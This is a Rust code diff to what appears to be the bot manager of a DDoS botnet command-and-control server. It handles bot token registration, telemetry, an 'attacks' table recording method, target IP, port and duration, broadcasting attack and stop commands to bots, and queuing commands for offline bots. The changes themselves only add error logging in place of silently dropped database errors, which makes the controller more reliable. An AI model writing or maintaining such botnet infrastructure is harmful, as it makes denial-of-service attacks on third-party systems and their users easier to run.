@@ -8,6 +8,7 @@ use sha2::{Sha256, Digest};
 use dashmap::DashMap;
 use sqlx::{SqlitePool, Row};
 use futures::stream::{self, StreamExt};
+use tracing::{error, info, debug};
 
 /// Bot token information for authentication
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -113,7 +114,7 @@ impl BotManager {
             .await
             .map_err(|e| format!("Database error: {}", e))?;
         
-        tracing::info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
+        info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
         Ok((bot_id, token))
     }
     
@@ -132,11 +133,14 @@ impl BotManager {
         let bot_id = Uuid::parse_str(&bot_id_str).ok()?;
 
         // Update last_used
-        let _ = sqlx::query("UPDATE bot_tokens SET last_used = ? WHERE token_hash = ?")
+        if let Err(e) = sqlx::query("UPDATE bot_tokens SET last_used = ? WHERE token_hash = ?")
             .bind(Utc::now())
             .bind(&token_hash)
             .execute(&self.pool)
-            .await;
+            .await 
+        {
+            error!("Failed to update last_used for bot token: {}", e);
+        }
 
         Some((bot_id, arch))
     }
@@ -153,16 +157,22 @@ impl BotManager {
             return Err(format!("No token found for bot ID {}", bot_id));
         }
         
-        tracing::info!("Revoked bot token for bot {}", bot_id);
+        info!("Revoked bot token for bot {}", bot_id);
         Ok(())
     }
     
     /// List all registered bot tokens
     pub async fn list_tokens(&self) -> Vec<BotToken> {
-        let rows = sqlx::query("SELECT token_hash, bot_id, arch, created_at, last_used FROM bot_tokens")
+        let rows = match sqlx::query("SELECT token_hash, bot_id, arch, created_at, last_used FROM bot_tokens")
             .fetch_all(&self.pool)
-            .await
-            .unwrap_or_default();
+            .await 
+        {
+            Ok(rows) => rows,
+            Err(e) => {
+                error!("Failed to list bot tokens: {}", e);
+                return Vec::new();
+            }
+        };
 
         rows.into_iter().filter_map(|row| {
             let bot_id_str: String = row.get("bot_id");
@@ -251,15 +261,22 @@ impl BotManager {
         // Use a transaction for batch insert
         if let Ok(mut tx) = self.pool.begin().await {
             for (bot_id, cpu, mem, time) in batch {
-                let _ = sqlx::query("INSERT OR REPLACE INTO bot_telemetry (bot_id, cpu_usage, memory_usage, last_updated) VALUES (?, ?, ?, ?)")
+                if let Err(e) = sqlx::query("INSERT OR REPLACE INTO bot_telemetry (bot_id, cpu_usage, memory_usage, last_updated) VALUES (?, ?, ?, ?)")
                     .bind(bot_id.to_string())
                     .bind(cpu)
                     .bind(mem)
                     .bind(time)
                     .execute(&mut *tx)
-                    .await;
+                    .await 
+                {
+                    error!("Failed to insert telemetry for bot {}: {}", bot_id, e);
+                }
             }
-            let _ = tx.commit().await;
+            if let Err(e) = tx.commit().await {
+                error!("Failed to commit telemetry transaction: {}", e);
+            }
+        } else {
+            error!("Failed to begin telemetry transaction");
         }
     }
 
@@ -291,7 +308,7 @@ impl BotManager {
                 let cmd = command.clone();
                 async move {
                     if let Err(e) = bot.cmd_tx.send(cmd).await {
-                        tracing::debug!("Failed to send stop command to bot: {}", e);
+                        debug!("Failed to send stop command to bot: {}", e);
                     }
                 }
             })
@@ -310,7 +327,7 @@ impl BotManager {
                 let cmd = command.clone();
                 async move {
                     if let Err(e) = bot.cmd_tx.send(cmd).await {
-                        tracing::debug!("Failed to send attack command to bot: {}", e);
+                        debug!("Failed to send attack command to bot: {}", e);
                     }
                 }
             })
@@ -319,10 +336,16 @@ impl BotManager {
 
     /// Get all currently active attacks from the database
     pub async fn get_active_attacks(&self) -> Vec<(usize, String, String, u16, u64)> {
-        let rows = sqlx::query("SELECT id, method, target_ip, target_port, duration, started_at FROM attacks WHERE status = 'running'")
+        let rows = match sqlx::query("SELECT id, method, target_ip, target_port, duration, started_at FROM attacks WHERE status = 'running'")
             .fetch_all(&self.pool)
-            .await
-            .unwrap_or_default();
+            .await 
+        {
+            Ok(rows) => rows,
+            Err(e) => {
+                error!("Failed to fetch active attacks: {}", e);
+                return Vec::new();
+            }
+        };
 
         let mut active_attacks = Vec::new();
         let now = Utc::now();
@@ -347,8 +370,7 @@ impl BotManager {
 
     /// Queue a command for a bot (if offline)
     pub async fn queue_command(&self, bot_id: Uuid, command: &str) -> Result<(), String> {
-        sqlx::query("INSERT INTO pending_commands (bot_id, command) VALUES (?, ?)
-")
+        sqlx::query("INSERT INTO pending_commands (bot_id, command) VALUES (?, ?)")
             .bind(bot_id.to_string())
             .bind(command)
             .execute(&self.pool)
@@ -359,11 +381,17 @@ impl BotManager {
 
     /// Get and remove pending commands for a bot
     pub async fn get_pending_commands(&self, bot_id: Uuid) -> Vec<String> {
-        let rows = sqlx::query("SELECT id, command FROM pending_commands WHERE bot_id = ? ORDER BY created_at ASC")
+        let rows = match sqlx::query("SELECT id, command FROM pending_commands WHERE bot_id = ? ORDER BY created_at ASC")
             .bind(bot_id.to_string())
             .fetch_all(&self.pool)
-            .await
-            .unwrap_or_default();
+            .await 
+        {
+            Ok(rows) => rows,
+            Err(e) => {
+                error!("Failed to fetch pending commands for bot {}: {}", bot_id, e);
+                return Vec::new();
+            }
+        };
             
         let mut commands = Vec::new();
         let mut ids = Vec::new();
@@ -377,10 +405,13 @@ impl BotManager {
         
         if !ids.is_empty() {
             for id in ids {
-                let _ = sqlx::query("DELETE FROM pending_commands WHERE id = ?")
+                if let Err(e) = sqlx::query("DELETE FROM pending_commands WHERE id = ?")
                     .bind(id)
                     .execute(&self.pool)
-                    .await;
+                    .await 
+                {
+                    error!("Failed to delete pending command {} for bot {}: {}", id, bot_id, e);
+                }
             }
         }
         
